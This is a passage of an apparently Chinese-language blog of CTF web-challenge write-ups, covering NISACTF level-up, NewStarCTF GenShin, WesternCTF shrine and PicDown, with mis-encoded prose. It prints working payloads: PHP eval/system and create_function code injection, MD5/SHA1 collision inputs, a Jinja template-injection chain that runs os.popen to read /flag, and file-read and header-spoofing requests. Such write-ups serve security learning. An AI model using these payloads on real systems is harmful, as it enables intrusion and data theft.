class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">String2Array</span>(<span class="variable">$attrstr</span>); </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?attrid=0&amp;attrstr=$&#123;eval(system(&#x27;cat /etc/timezone&#x27;))&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240126192723886.png" alt="image-20240126192723886"></p><h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>è¿›ç¯å¢ƒï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰</p><p><img src="/../images/image-20240126203106031.png" alt="image-20240126203106031"></p><p>æŸ¥çœ‹robotx.txtï¼Œæç¤ºlevel_2_1s_h3re.php</p><p><img src="/../images/image-20240126203126303.png" alt="image-20240126203126303"></p><p>è®¿é—®level_2_1s_h3re.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¼ºç¢°æ’ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;array2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2</span><br></pre></td></tr></table></figure><p>Burpä¼ å‚ï¼Œæç¤ºLevel___3.php</p><p><img src="/../images/image-20240126203354873.png" alt="image-20240126203354873"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 3</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>sha1ç¢°æ’ï¼Œpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1&amp;array2=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure><p>Burpä¼ å‚ï¼Œæç¤ºlevel_level_4.php</p><p><img src="/../images/image-20240126203700523.png" alt="image-20240126203700523"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨+,phpä¼šå°†å…¶è§£æä¸º_</p><p><img src="/../images/image-20240126204004922.png" alt="image-20240126204004922"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create_function()ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯æ­£åˆ™é™åˆ¶ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—å’Œå­—æ¯ï¼Œå‰é¢åŠ ä¸ªåæ–œæ å°±è¡Œ</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;ls /&#x27;);//</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240126204241445.png" alt="image-20240126204241445"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;cat /f*&#x27;);//</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240126204306851.png" alt="image-20240126204306851"></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-GenShin"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-GenShin" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]GenShin"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]GenShin</h1><p>F12</p><p><img src="/../images/image-20240127111118468.png" alt="image-20240127111118468"></p><p>GETä¼ å‚ï¼Œå‘ç°å€¼è¢«è¾“å‡º</p><p><img src="/../images/image-20240127111155335.png" alt="image-20240127111155335"></p><p>å°è¯•æ¨¡æ¿æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20240127111703078.png" alt="image-20240127111703078"></p><p>æ”¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(7*7)%&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240127111802456.png" alt="image-20240127111802456"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(132)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)%&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240127111957025.png" alt="image-20240127111957025"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(10)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)%&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240127112100514.png" alt="image-20240127112100514"></p><h1 id="DASCTF2022-07èµ‹èƒ½èµ›-Ez-to-getflag"><a href="#DASCTF2022-07èµ‹èƒ½èµ›-Ez-to-getflag" class="headerlink" title="[DASCTF2022.07èµ‹èƒ½èµ›]Ez to getflag"></a>[DASCTF2022.07èµ‹èƒ½èµ›]Ez to getflag</h1><p>å›¾ç‰‡æŸ¥çœ‹ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="/../images/image-20240212202352568.png" alt="image-20240212202352568"></p><p><img src="/../images/image-20240212202402315.png" alt="image-20240212202402315"></p><h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>è®¿é—®ï¼Œflagéœ€è¦è´­ä¹°</p><p><img src="/../images/image-20240215181512924.png" alt="image-20240215181512924"></p><p><img src="/../images/image-20240215181527426.png" alt="image-20240215181527426"></p><p>æŸ¥çœ‹æºç ï¼Œå­˜åœ¨flag.php</p><p><img src="/../images/image-20240215181606788.png" alt="image-20240215181606788"></p><p>è®¿é—®ï¼Œæç¤ºåªæœ‰è´­ä¹°è€…å’Œè‡ªå·±èƒ½çœ‹åˆ°flag</p><p><img src="/../images/image-20240215181657960.png" alt="image-20240215181657960"></p><p>ä¼ªé€ XFF</p><p><img src="/../images/image-20240215181802465.png" alt="image-20240215181802465"></p><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"> </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡&#x2F;shrine&#x2F;è·¯ç”±æ¥åˆ©ç”¨SSTIï¼Œä½†æ˜¯è¿™é‡Œconfigå’Œselfæ˜¯é»‘åå•</p><p>åˆ©ç”¨pythonå¯¹è±¡ä¹‹é—´çš„å¼•ç”¨å…³ç³»æ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡</p><p>æœ‰ä¸¤ä¸ªå‡½æ•°åŒ…å«äº†current_appå…¨å±€å˜é‡ï¼šurl_forå’Œget_flashed_messages</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;url_for.__globals__&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240215182954656.png" alt="image-20240215182954656"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240215183151899.png" alt="image-20240215183151899"></p><h1 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/app/app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span 